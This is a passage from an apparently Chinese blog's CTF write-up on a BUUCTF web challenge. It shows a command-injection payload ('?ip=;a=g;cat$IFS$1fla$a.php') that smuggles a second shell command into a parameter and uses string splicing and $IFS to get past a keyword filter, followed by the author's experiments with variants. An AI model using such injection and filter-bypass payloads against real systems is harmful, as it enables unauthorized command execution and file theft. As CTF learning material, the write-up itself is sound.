href="https://www.cnblogs.com/GLory-LTF/p/15359485.html%E3%80%82%E9%87%8C%E9%9D%A2%E6%9C%89%E8%AE%B2%E5%88%B0%E5%A6%82%E6%9E%9Ccat%E5%AD%97%E7%AC%A6%E8%A2%ABban%E4%BA%86%E4%BD%86%E6%98%AF%E9%9D%9E%E5%BE%97%E7%94%A8cat%E5%91%BD%E4%BB%A4%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BB%8B%E7%BB%8D%E4%BA%86%E4%B8%80%E7%A7%8D%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%EF%BC%88%E8%AE%B0%E5%B0%8F%E6%9C%AC%E6%9C%AC%EF%BC%89%E3%80%82">https://www.cnblogs.com/GLory-LTF/p/15359485.html。里面有讲到如果cat字符被ban了但是非得用cat命令，这里介绍了一种命令拼接绕过（记小本本）。</a></p><p>理论知道了，开始实践</p><p><img src="/2023/03/09/BUUCTF/image-20230214025001351.png"></p><p>嗯。。属于是学了点知识不会灵活变通了，再次求助大佬，给出的payload是</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=;a=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><p>又有收获了，拼接绕过不一定要每个字母都拼接，看着这个payload有个想法，如果把$a的位置在flag四个位置改变会怎么样。实践。</p><p><img src="/2023/03/09/BUUCTF/image-20230214025741500.png"></p><p>替换字符f的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214025844260.png"></p><p>替换字符l的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214025933119.png"></p><p>替换字符a的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214030039533.png"></p><p>看来只有g的位置可以。然后注意到$a是代码中原有的变量，如果构造payload时用的是b变量会怎么样呢</p><p><img src="/2023/03/09/BUUCTF/image-20230214030227918.png"></p><p>也是可行的</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
